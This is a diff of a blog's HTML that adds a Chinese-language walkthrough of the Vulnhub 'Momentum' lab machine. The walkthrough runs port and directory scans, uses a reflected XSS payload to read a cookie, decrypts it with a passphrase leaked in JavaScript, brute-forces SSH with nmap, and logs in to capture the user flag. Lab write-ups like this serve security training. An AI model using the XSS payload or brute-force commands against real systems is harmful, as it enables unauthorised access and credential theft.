@@ -18,17 +18,17 @@
   <link 
     rel="icon" 
     href="/img/logo.png">
-  <title>Archive</title>
+  <title>Vulnhub|Momentum</title>
   
     
       <meta 
         property="og:title" 
-        content="Archive">
+        content="Vulnhub|Momentum">
     
     
       <meta 
         property="og:url" 
-        content="https://cbeartalk.top/archives/2021/page/3/index.html">
+        content="https://cbeartalk.top/b1af99b0.html">
     
     
       <meta 
@@ -36,6 +36,42 @@
         content="/img/logo.png">
     
     
+      <meta 
+        property="og:img" 
+        content="难度：⭐⭐⭐">
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2022-05-25">
+      <meta 
+        property="og:article:modified_time" 
+        content="2022-05-25">
+      <meta 
+        property="og:article:author" 
+        content="CBear">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="Vulnhub">
+        
+          <meta 
+            property="og:article:tag" 
+            content="SSH爆破">
+        
+          <meta 
+            property="og:article:tag" 
+            content="AES">
+        
+          <meta 
+            property="og:article:tag" 
+            content="XSS">
+        
+      
     
   
   <script>
@@ -174,6 +210,8 @@
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
   
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
 <meta name="generator" content="Hexo 5.4.0"></head>
 
   <body>
@@ -273,114 +311,227 @@
         <div class="container">
           <div class="columns">
             <main class="main-column">
-<div class="card card-content">
-  <h1 class="widget-title">Archive</h1>
-</div>
-<div class="archive-timeline">
-  
-  
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      Vulnhub|Momentum
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-05-25T07:24:35.431Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2022-05-25</span>
+    </time>
     
-      <div class="archive-timeline-tag"><span>2021</span></div>
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" 
+          class="post-meta-link">
+          渗透测试
+        </a>
       
     
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-12-03</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/a8b692c1.html"
-              class="archive-timeline-post-item">
-              Vulnhub|Os-hackNos
-            </a>
-          </div>
-        </div>
+    
+      <span class="dot"></span>
+      <span>865 words</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/Vulnhub/" 
+            class="post-meta-link">
+            Vulnhub
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/SSH%E7%88%86%E7%A0%B4/" 
+            class="post-meta-link">
+            SSH爆破
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/AES/" 
+            class="post-meta-link">
+            AES
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/XSS/" 
+            class="post-meta-link">
+            XSS
+          </a>
+        
       </div>
     </div>
   
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h2 id="0-_u9776_u673A_u5B89_u88C5"><a href="#0-_u9776_u673A_u5B89_u88C5" class="headerlink" title="0.靶机安装"></a>0.靶机安装</h2><blockquote>
+<p>不再赘述，可看之前的<strong>Vulnhub</strong>相关文章。  </p>
+</blockquote>
+<h2 id="1-_u4FE1_u606F_u6536_u96C6"><a href="#1-_u4FE1_u606F_u6536_u96C6" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><blockquote>
+<p>端口：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
+└─# nmap -A -p- 192.168.81.134     
+Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-25 02:27 CDT
+Nmap scan report for 192.168.81.134
+Host is up (0.00051s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 (RSA)
+|   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)
+|_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)
+80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Momentum | Index 
+|_http-server-header: Apache&#x2F;2.4.38 (Debian)
+MAC Address: 00:0C:29:3B:6D:A4 (VMware)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>目录：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
+└─# gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;192.168.81.134 -x php,html,txt
+......
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+2022&#x2F;05&#x2F;25 02:30:08 Starting gobuster in directory enumeration mode
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+&#x2F;index.html           (Status: 200) [Size: 2001]
+&#x2F;img                  (Status: 301) [Size: 314] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;img&#x2F;]
+&#x2F;css                  (Status: 301) [Size: 314] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;css&#x2F;]
+&#x2F;manual               (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;manual&#x2F;]
+&#x2F;js                   (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;js&#x2F;]    
+......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+</blockquote>
+<h2 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2.getshell"></a>2.getshell</h2><blockquote>
+<p><code>/css</code> 和 <code>/manual</code> 没有发现什么敏感信息，<code>/index.html</code> 是 <code>img</code> 4张图片的展示界面。<br><code>/js</code> 下存在 <code>main.js</code> 访问得到 <strong>AES密钥 SecretPassphraseMomentum</strong> ：<br><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">viewDetails</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+ window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"opus-details.php?id="</span><span class="token operator">+</span>str<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">/*
+var CryptoJS = require("crypto-js");
+var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
+console.log(decrypted.toString(CryptoJS.enc.Utf8));
+*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>回到 <code>index.html</code> 点击图片，url重定向到 <code>opus-details.php?id= +str</code>。<br>使用 <code>/opus-details.php?id=&lt;img src=1 onerror=alert(document.cookie)&gt;</code> 获取 <strong>Cookie:U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</strong> 。<br>将得到的 <strong>Cookie</strong> 作为密文，与 <strong>AES密钥</strong> 进行AES解密，得到字符串 <strong>auxerre-alienum##</strong>  。<br>80端口没有找可以登录的入口，故将解密得到的字符串拆解为用户名和密码字典：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Desktop]
+└─# cat db.txt       
+auxerre-alienum##
+auxerre-alienum
+auxerre-
+auxerre
+-alienum##
+alienum##
+alienum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>使用 <code>nmap</code> 进行ssh爆破：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Desktop]
+└─# nmap -p 22 --script ssh-brute --script-args userdb&#x3D;name.txt,passdb&#x3D;passwd.txt 192.168.81.134
+Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-25 02:20 CDT
+NSE: [ssh-brute] Trying username&#x2F;password pair: auxerre-alienum##:auxerre-alienum##
+......
+PORT   STATE SERVICE
+22&#x2F;tcp open  ssh
+| ssh-brute: 
+|   Accounts: 
+|     auxerre:auxerre-alienum## - Valid credentials
+|_  Statistics: Performed 43 guesses in 13 seconds, average tps: 3.3
+MAC Address: 00:0C:29:3B:6D:A4 (VMware)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到ssh账号密码 <strong>auxerre:auxerre-alienum##</strong>，成功ssh登录，并在当前用户目录下找到flag：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Desktop]
+└─# ssh &#39;auxerre&#39;@&#39;192.168.81.134&#39;
+......
+auxerre@Momentum:~$ id
+uid&#x3D;1000(auxerre) gid&#x3D;1000(auxerre) groups&#x3D;1000(auxerre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+auxerre@Momentum:~$ pwd
+&#x2F;home&#x2F;auxerre
+auxerre@Momentum:~$ ls -l
+total 4
+-rwx------ 1 auxerre auxerre 146 Apr 22  2021 user.txt
+auxerre@Momentum:~$ cat user.txt
+[ Momentum - User Owned ]
+---------------------------------------
+flag : 84157165c30ad34d18945b647ec7f647
+---------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+</blockquote>
+<h2 id="3-_u63D0_u6743"><a href="#3-_u63D0_u6743" class="headerlink" title="3.提权"></a>3.提权</h2>
+  </div>
+  <div>
     
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-12-02</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/2b3bf173.html"
-              class="archive-timeline-post-item">
-              Tools
-            </a>
-          </div>
-        </div>
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            CBear
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://cbeartalk.top/b1af99b0.html">
+            https://cbeartalk.top/b1af99b0.html
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span><a target="_blank" rel="noopener">转载请注明出处！</a></p>
       </div>
-    </div>
+    
+  </div>
+</article>
+<div class="nav">
   
-    
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-12-02</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/6ceb590b.html"
-              class="archive-timeline-post-item">
-              Vulnhub|Me and My Girlfriend
-            </a>
-          </div>
-        </div>
-      </div>
-    </div>
   
-    
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-12-01</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/e2181504.html"
-              class="archive-timeline-post-item">
-              提权
-            </a>
-          </div>
+    <div class="nav-item-next">
+      <a 
+        href="/36be6aa4.html" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">Next</div>
+          
+            <div class="nav-title">Vulhub|Nacos集合 </div>
+          
         </div>
-      </div>
-    </div>
-  
-    
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-11-30</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/b822f9c7.html"
-              class="archive-timeline-post-item">
-              Stay sharp, stay alone.
-            </a>
-          </div>
-        </div>
-      </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
     </div>
   
 </div>
 
-  <div class="nav">
-  
-    <div class="nav-item-prev">
-      <a 
-        href="/archives/2021/page/2/" 
-        class="nav-link">
-        <i class="iconfont icon-left nav-prev-icon"></i>
-        <div>
-          <div class="nav-label">Prev</div>
-          
-        </div>
-      </a>
-    </div>
-  
-  
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
 </div>
-</main>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
+</div></main>
             <aside class="left-column">
               
               <div class="card card-author">
@@ -434,6 +585,18 @@
               </div>
                <div class="sticky-tablet">
   
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
+      </div>
+    </article>
   
   
   <article class="card card-content categories-widget">
@@ -596,198 +759,21 @@
   </article>
   
   
-    <article class="card card-content widescreen-archive archive-widget">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>Archive
-  </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-          <a 
-            href="/archives/2022" 
-            class="archive-card-list-item">
-            2022
-            <span class="archive-card-list-item-badge">13</span>
-          </a>
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2021" 
-        class="archive-card-list-item">
-        2021
-        <span class="archive-card-list-item-badge">25</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
-  
 </div>
             </aside>
             <aside class="right-column">
               <div class="sticky-widescreen">
   
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
+    </article>
   
   
   <article class="card card-content">
@@ -824,193 +810,6 @@
 </div>
   </article>
   
-  
-    <article class="card card-content">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>Archive
-  </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-          <a 
-            href="/archives/2022" 
-            class="archive-card-list-item">
-            2022
-            <span class="archive-card-list-item-badge">13</span>
-          </a>
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2021" 
-        class="archive-card-list-item">
-        2021
-        <span class="archive-card-list-item-badge">25</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
   
 </div>
             </aside>
@@ -1094,6 +893,36 @@
 </a> 
      
      
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
      
      
     <script src="/js/main.js"></script> 
